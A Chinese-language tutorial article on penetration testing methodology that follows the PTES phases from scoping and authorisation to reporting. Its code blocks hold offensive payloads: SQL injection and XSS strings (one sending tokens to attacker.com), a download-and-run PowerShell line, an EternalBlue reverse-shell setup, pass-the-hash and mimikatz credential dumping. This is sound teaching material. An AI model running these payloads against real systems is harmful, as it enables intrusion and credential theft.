---
title: "渗透测试方法论"
date: 2026-04-22 00:00:00
author: PFinal南丞
description: "系统学习渗透测试方法论，掌握信息收集、漏洞扫描、权限提升、后渗透等核心阶段的技术和工具，建立规范的渗透测试流程。"
keywords:
  - 渗透测试
  - Penetration Testing
  - 安全测试
  - 漏洞扫描
  - 信息收集
  - 权限提升
tags:
  - penetration-testing
  - security
  - offensive
---

# 渗透测试方法论

渗透测试是一种通过模拟攻击者行为来评估系统安全性的方法。本文将系统介绍渗透测试的完整流程、技术方法和最佳实践。

## 渗透测试类型

### 按信息了解程度分类

| 类型 | 说明 | 适用场景 |
|------|------|----------|
| **黑盒测试** | 不了解目标内部信息 | 模拟外部攻击者 |
| **白盒测试** | 完全了解目标架构 | 代码审计、内部评估 |
| **灰盒测试** | 部分了解目标信息 | 平衡效率和覆盖度 |

### 按测试深度分类

- **外部测试**：从互联网侧进行测试
- **内部测试**：模拟内网攻击者
- **盲测**：模拟真实 APT 攻击
- **双盲测试**：安全团队不知情

## 渗透测试流程

### PTES 标准流程

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│  前期交互   │───▶│  情报收集   │───▶│  威胁建模   │───▶│  漏洞分析   │
│  Pre-Eng    │    │  Intelligence│    │   Modeling  │    │  Vulnerability│
└─────────────┘    └─────────────┘    └─────────────┘    └──────┬──────┘
                                                                 │
┌─────────────┐    ┌─────────────┐    ┌─────────────┐           │
│   报告输出   │◀───│  后渗透测试  │◀───│  渗透攻击   │◀──────────┘
│  Reporting  │    │ Post Exploit│    │  Exploitation│
└─────────────┘    └─────────────┘    └─────────────┘
```

## 第一阶段：前期交互

### 确定测试范围

```yaml
# 测试范围文档示例
test_scope:
  target:
    - domain: example.com
      include_subdomains: true
    - ip_range: 192.168.1.0/24
    - exclude: [192.168.1.1, admin.example.com]
  
  testing_type: gray_box
  
  constraints:
    - testing_hours: "20:00-08:00"
    - avoid_systems: [production_db, payment_gateway]
    - max_concurrent_scans: 5
  
  deliverables:
    - executive_summary
    - technical_report
    - remediation_guide
```

### 获得授权

```
渗透测试授权书

授权方：___________
被授权方：___________

测试目标：
- 域名：example.com
- IP段：192.168.1.0/24

测试时间：2024-01-01 至 2024-01-31

授权范围：
□ 信息收集
□ 漏洞扫描
□ 漏洞利用
□ 权限提升
□ 后渗透测试

签字：___________ 日期：___________
```

## 第二阶段：情报收集

### 被动信息收集

#### 域名信息

```bash
# WHOIS 查询
whois example.com

# DNS 枚举
dig example.com ANY
dnsenum example.com
fierce --domain example.com

# 子域名枚举
subfinder -d example.com
amass enum -d example.com
assetfinder --subs-only example.com

# 证书透明度日志
crtsh example.com
```

#### 网络资产

```bash
# IP 信息查询
shodan host 8.8.8.8
censys view 8.8.8.8

# 端口扫描
masscan 192.168.1.0/24 -p1-65535 --rate=1000
nmap -sS -sV -O 192.168.1.1

# Web 技术识别
whatweb http://example.com
wappalyzer http://example.com
```

#### 人员信息

```bash
# 邮箱收集
theHarvester -d example.com -b all

# 社交媒体
sherlock username

# 代码泄露搜索
git-dumper https://github.com/example/repo
truffleHog --regex --entropy=False .
```

### 主动信息收集

```bash
# 完整端口扫描
nmap -sS -sV -sC -O -A -T4 -p- -oN full_scan.txt target.com

# UDP 扫描
nmap -sU --top-ports 100 target.com

# Web 目录扫描
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# 虚拟主机发现
gobuster vhost -u http://target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

## 第三阶段：威胁建模

### 攻击面分析

```
攻击面识别：
├─ 网络层
│  ├─ 开放端口和服务
│  ├─ 网络架构
│  └─ 防火墙规则
├─ 应用层
│  ├─ Web 应用
│  ├─ API 接口
│  └─ 移动应用
├─ 主机层
│  ├─ 操作系统
│  ├─ 中间件
│  └─ 数据库
└─ 人员层
   ├─ 社会工程
   └─ 物理访问
```

### 威胁分类

| 威胁类型 | 描述 | 示例 |
|----------|------|------|
| STRIDE | 欺骗、篡改、否认、信息泄露、拒绝服务、权限提升 | 身份伪造、数据篡改 |
| OWASP Top 10 | Web 应用常见漏洞 | SQL 注入、XSS |
| MITRE ATT&CK | 攻击技术知识库 | T1190 - Exploit Public-Facing Application |

## 第四阶段：漏洞分析

### 自动化扫描

```bash
# Web 漏洞扫描
nikto -h http://target.com
skipfish -o skipfish_output http://target.com

# 综合扫描器
openvas-start
nessuscli scan new --policy "Basic Network Scan" --targets "192.168.1.0/24"

# API 扫描
arjun -u http://target.com/api/endpoint
postman collection scan
```

### 手动测试

#### SQL 注入测试

```sql
-- 错误注入
' OR '1'='1
' UNION SELECT null,null,null--

-- 盲注测试
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
' AND 1=IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0)--

-- 工具
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
```

#### XSS 测试

```html
<!-- 反射型 XSS -->
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>

<!-- 存储型 XSS -->
<svg onload=fetch('http://attacker.com/?c='+localStorage.getItem('token'))>

<!-- DOM XSS -->
#<img src=x onerror=alert(1)>
```

#### 命令注入测试

```bash
# 基础测试
cat /etc/passwd
; cat /etc/passwd
| cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)

# 绕过技巧
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat</etc/passwd
```

## 第五阶段：渗透攻击

### 漏洞利用框架

```bash
# Metasploit 基础
msfconsole
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.10
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.5
msf6 exploit(ms17_010_eternalblue) > exploit

# Cobalt Strike
./teamserver 192.168.1.5 password
./start.sh
```

### Web 漏洞利用

```bash
# 文件上传绕过
# 修改 Content-Type: image/jpeg
# 使用双重扩展名：shell.php.jpg
# 使用空字节：shell.php%00.jpg

# 反序列化利用
ysoserial CommonsCollections1 'calc.exe'

# SSRF 利用
curl http://target.com/fetch?url=file:///etc/passwd
curl http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
```

## 第六阶段：后渗透测试

### 权限提升

#### Linux 提权

```bash
# 信息收集
whoami
id
cat /etc/passwd
cat /etc/shadow
sudo -l
crontab -l
find / -perm -4000 -type f 2>/dev/null

# 常见提权向量
# SUID 文件
./suid_binary

# 内核漏洞
uname -a
searchsploit linux kernel 4.4.0

# 计划任务
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /tmp/evil.sh
chmod +x /tmp/evil.sh
```

#### Windows 提权

```powershell
# 系统信息
whoami /priv
systeminfo
net user
net localgroup administrators

# 常见工具
# WinPEAS
winPEASany.exe

# PowerUp
powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://attacker/PowerUp.ps1'); Invoke-AllChecks"

# 内核漏洞
# Juicy Potato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

### 横向移动

```bash
# Pass the Hash
pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //192.168.1.10 cmd

# Pass the Ticket
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;3e7]-2-0-60a10000-admin@krbtgt-EXAMPLE.COM.kirbi

# 远程执行
wmiexec.py domain/administrator:password@192.168.1.10
psexec.py domain/administrator:password@192.168.1.10
```

### 数据收集

```bash
# 敏感文件
find / -name "*.conf" -o -name "*.config" -o -name "*.env" 2>/dev/null
find /home -name ".ssh" -o -name ".aws" 2>/dev/null

# 数据库
dump database
mysqldump -u root -p database > backup.sql

# 凭证提取
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
```

## 第七阶段：报告输出

### 报告结构

```markdown
# 渗透测试报告

## 1. 执行摘要
- 测试概述
- 关键发现
- 风险评级
- 修复建议

## 2. 测试范围
- 目标系统
- 测试时间
- 测试方法

## 3. 技术发现
### 高危漏洞
#### VULN-001: SQL 注入
- **风险等级**: 高危
- **CVSS 评分**: 8.5
- **位置**: http://target.com/login.php
- **描述**: 登录页面存在 SQL 注入漏洞
- **复现步骤**:
  1. 访问登录页面
  2. 输入用户名: admin' OR '1'='1
  3. 任意密码登录成功
- **影响**: 可绕过认证，获取所有用户数据
- **修复建议**: 使用参数化查询

### 中危漏洞
...

### 低危漏洞
...

## 4. 附录
- 工具列表
- 测试证据
- 参考链接
```

### CVSS 评分

| 等级 | 分数范围 | 颜色 |
|------|----------|------|
| 严重 | 9.0-10.0 | 🔴 |
| 高危 | 7.0-8.9 | 🟠 |
| 中危 | 4.0-6.9 | 🟡 |
| 低危 | 0.1-3.9 | 🟢 |
| 信息 | 0.0 | ⚪ |

## 最佳实践

### 1. 道德准则

- 仅在授权范围内进行测试
- 避免对生产系统造成影响
- 保护发现的敏感信息
- 及时报告发现的漏洞

### 2. 技术准则

- 记录所有操作
- 保持工具更新
- 验证漏洞影响
- 提供修复建议

### 3. 法律合规

- 获得书面授权
- 遵守当地法律
- 保护客户数据
- 签署保密协议

## 总结

渗透测试是评估系统安全性的重要手段，通过规范的流程和方法，可以有效发现安全风险并提供修复建议。

---

**参考资源：**
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PTES Technical Guidelines](http://www.pentest-standard.org/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
